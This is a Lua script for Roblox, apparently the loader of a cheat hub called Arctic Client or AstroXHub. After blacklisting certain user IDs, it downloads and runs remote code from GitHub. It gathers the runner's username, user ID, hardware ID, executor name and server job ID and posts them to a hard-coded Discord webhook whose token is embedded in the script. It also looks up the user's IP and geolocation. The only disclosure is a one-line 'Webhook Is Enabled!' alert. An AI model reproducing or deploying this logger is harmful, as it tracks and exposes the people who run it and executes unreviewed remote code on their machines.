repeat wait() until game:IsLoaded()
BlackList = {7837080873, 7639808387, 5416068413, 3227272858}

if table.find(BlackList, game:GetService("Players").LocalPlayer.UserId) then
    game:GetService("Players").LocalPlayer:Kick("Arctic Client : Blacklisted, Think this was a mistake? Join Our Telegram Server\n لقد تم تبيندك من استرو اكس هل تضن انهو خطأ يرجه دخول سيرفير تليگرام")
  else
  local Alert = loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroXTeam/Project-/refs/heads/main/Alert"))()
Alert:create("Webhook Is Enabled!")
local Players = game:GetService("Players")
local Name = game.Players.LocalPlayer.Name
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ExecutorUsing = identifyexecutor()
local HttpService = game:GetService("HttpService")
local Data =
{
    ["embeds"] = {
        {
            ["title"] = " 🧾 Detect Account",
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
            ["description"] = "**DisplayName**\n```"..game.Players.LocalPlayer.DisplayName.." ```\n**UserName**\n```"..Name.."```",
            ["color"] = tonumber("5800FF"),
            ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1277112182743629969/1277337544463224898/Picsart_24-08-26_01-42-34-420.png?ex=66ccccca&is=66cb7b4a&hm=80a0165401d2357f1386cfa88da35a3df2427c1186b0e8b7955272f6c5f6ead9&"},
            ["fields"] = {
                {
                    ["name"] = "💻 Executer:",
                    ["value"] = "```"..ExecutorUsing.."```",
                    ["inline"] = true
                },
                {                
                    ["name"] = "🚀 User ID:",
                    ["value"] = game.Players.LocalPlayer.UserId,
                    ["inline"] = true
                },
                {
                    ["name"] = "💳 Hwid:",
                    ["value"] = hwid,
                    ["inline"] = true
                },
                
                {                
                    ["name"] = "⏳ Time:",
                    ["value"] = tostring(os.date("%X")),
                    ["inline"] = true
                },
        
                {                
                    ["name"] = "🤑 Job ID:",
                    ["value"] = " " .. ConsoleJobId,
                    ["inline"] = true
                },
                
                {
                    ["name"] = "🥰 Ty For Use 🥰:",
                    ["value"] = "**__AstroXHub__**",
                    ["inline"] = true          
                }
            }              
        }
    }
}
local Headers = {["Content-Type"] = "application/json"}
local Encoded = HttpService:JSONEncode(Data)
local Request = http_request or request or HttpPost or syn.request
local Final = {Url = "https://discord.com/api/webhooks/1332273974712860742/Fm38Su-84zMVt4cuZiflPqNQXVEBkj94jqag6LgNWCLyrGE6KbKH-xWOaU6bQiOW1YyP", Body = Encoded, Method = "POST", Headers = Headers}
Request(Final)
end
